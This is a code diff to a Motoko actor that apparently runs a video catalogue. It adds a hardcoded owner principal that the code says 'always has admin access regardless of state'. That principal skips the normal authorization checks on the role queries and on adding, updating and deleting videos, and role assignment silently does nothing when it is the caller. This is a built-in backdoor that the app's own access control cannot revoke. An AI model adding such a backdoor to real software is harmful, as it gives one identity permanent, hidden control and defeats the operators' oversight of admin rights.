@@ -5,9 +5,16 @@ import Text "mo:core/Text";
 import Array "mo:core/Array";
 import Iter "mo:core/Iter";
 
-persistent actor {
+actor {
   // === Authorization ===
   transient let accessControlState : AccessControl.AccessControlState = AccessControl.initState();
+
+  // Hardcoded admin principal - always has admin access regardless of state
+  let OWNER_PRINCIPAL : Text = "csuk4-6hjxz-lk7tk-4olsv-2msx7-5ezeo-q35jl-q6p43-57hil-xgt7l-3ae";
+
+  func isOwner(caller : Principal) : Bool {
+    caller.toText() == OWNER_PRINCIPAL;
+  };
 
   public shared ({ caller }) func _initializeAccessControlWithSecret(userSecret : Text) : async () {
     switch (Prim.envVar<system>("CAFFEINE_ADMIN_TOKEN")) {
@@ -19,14 +26,18 @@ persistent actor {
   };
 
   public query ({ caller }) func getCallerUserRole() : async AccessControl.UserRole {
+    if (isOwner(caller)) return #admin;
     AccessControl.getUserRole(accessControlState, caller);
   };
 
   public shared ({ caller }) func assignCallerUserRole(user : Principal, role : AccessControl.UserRole) : async () {
-    AccessControl.assignRole(accessControlState, caller, user, role);
+    if (not isOwner(caller)) {
+      AccessControl.assignRole(accessControlState, caller, user, role);
+    };
   };
 
   public query ({ caller }) func isCallerAdmin() : async Bool {
+    if (isOwner(caller)) return true;
     AccessControl.isAdmin(accessControlState, caller);
   };
 
@@ -203,7 +214,7 @@ persistent actor {
 
   // === Admin Mutations ===
   public shared ({ caller }) func addVideo(title : Text, artist : Text, category : Text, youtubeUrl : Text) : async VideoEntry {
-    if (not AccessControl.isAdmin(accessControlState, caller)) {
+    if (not isOwner(caller) and not AccessControl.isAdmin(accessControlState, caller)) {
       Runtime.trap("Unauthorized");
     };
     let videoId = extractVideoId(youtubeUrl);
@@ -222,7 +233,7 @@ persistent actor {
   };
 
   public shared ({ caller }) func updateVideo(id : Nat, title : Text, artist : Text, category : Text, youtubeUrl : Text) : async Bool {
-    if (not AccessControl.isAdmin(accessControlState, caller)) {
+    if (not isOwner(caller) and not AccessControl.isAdmin(accessControlState, caller)) {
       Runtime.trap("Unauthorized");
     };
     let videoId = extractVideoId(youtubeUrl);
@@ -237,7 +248,7 @@ persistent actor {
   };
 
   public shared ({ caller }) func deleteVideo(id : Nat) : async Bool {
-    if (not AccessControl.isAdmin(accessControlState, caller)) {
+    if (not isOwner(caller) and not AccessControl.isAdmin(accessControlState, caller)) {
       Runtime.trap("Unauthorized");
     };
     let before = videos.size();
